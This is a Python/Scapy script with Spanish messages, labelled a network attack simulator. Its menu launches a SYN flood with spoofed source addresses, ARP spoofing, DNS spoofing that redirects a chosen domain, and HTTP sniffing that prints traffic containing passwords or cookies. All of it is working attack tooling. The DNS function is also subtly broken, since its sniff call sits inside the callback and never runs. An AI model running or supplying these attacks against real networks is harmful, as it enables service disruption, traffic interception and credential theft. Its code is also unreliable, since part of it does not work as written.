from scapy.all import * 
import time

def syn_flood(dst_ip, dst_port):
    print(f"[+]Iniciando SNY flood a {dst_ip}:{dst_port}")
    for i in range (100):
        ip = IP(dst=dst_ip, src=RandIP())
        tcp = TCP(dport=dst_port, sport=RandShort(), flags="S")
        pkt = ip / tcp
        send(pkt, verbose=False)
        print(f"[+] Paquete SYN #{i+1} enviado")
        
def arp_spoof (ip_victima, spoof_ip):
    victim_mac = getmacbyip(ip_victima)
    if not victim_mac:
        print("[!]No se pudo obtener la Mac de la víctima")
        return
    
    pkt = ARP(op=2, pdst=ip_victima, hwdst=victim_mac, psrc=spoof_ip)
    print(f"[+] Enviando paquetes ARP a {ip_victima} diciendo que somos {spoof_ip}")
    try:
        while True:
            send(pkt, verbose=False)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[!] Ataque Arp detenido")
        
def dns_spoof(target_ip, fake_domain, fake_ip):
    def process(pkt):
        if pkt.haslayer(DNSQR) and pkt[IP].src == target_ip:
            spoofed_pkt = IP(dst=pkt[IP].src, src=pkt [IP].dst) /\
                UDP(dport=pkt[UDP].sport, sport=53)/\
                    DNS(id=pkt[DNS].id, 
                        qr=1, 
                        aa=1,
                        qd=pkt[DNS].qd,
                        an=DNSRR(rrname=fake_domain + ".", ttl=10, rdata=fake_ip))
            send(spoofed_pkt, verbose=False)
            print(f"[+] Enviada respuesta DNS falsa: {fake_domain} -> {fake_ip}")
        print("[+] Escuchando consultas DNS...")
        sniff(filter="udp port 53", prn=process, store=0)

def sniff_http():
    print("[+] Sniffeando tráfico HTTP (puerto 80)")
    def analizar(pkt):
        if pkt.haslayer(Raw):
            carga = pkt[Raw].load.decode(errors = "ignore")
            if "password" in carga.lower() or "cookie" in carga.lower():
                print("\n[+] Posible información sensible detectada:")
                print(carga)
    sniff(filter="tcp port 80", prn=analizar, store=0)

def menu():
    print("""
========= Simulador de Ataques de Red =========
1. SNY Flood
2. ARP Spoofing
3. DNS Spoofing
4. Sniffing HTTP       
    """)
    opcion = input("Selecciona una opción: ")
    
    if opcion == "1":
        ip = input("IP del objectivo: ")
        puerto = int(input("Puerto destino: "))
        syn_flood(ip, puerto)
    
    elif opcion == "2":
        victima = input("Ip de la victima: ")
        suplantar = input("IP a suplantar: ")
        arp_spoof(victima, suplantar)
    
    elif opcion == "3":
        objetivo = input("IP del cliente(victima): ")
        dominio_falso = input("Dominio a falsificar: ")
        ip_falsa = input("IP falsa para redirigir: ")
        dns_spoof(objetivo, dominio_falso, ip_falsa)
    
    elif opcion == "4":
        sniff_http()
    
    else:
        print("Opción invalida")
        
if __name__ == "__main__":
    menu()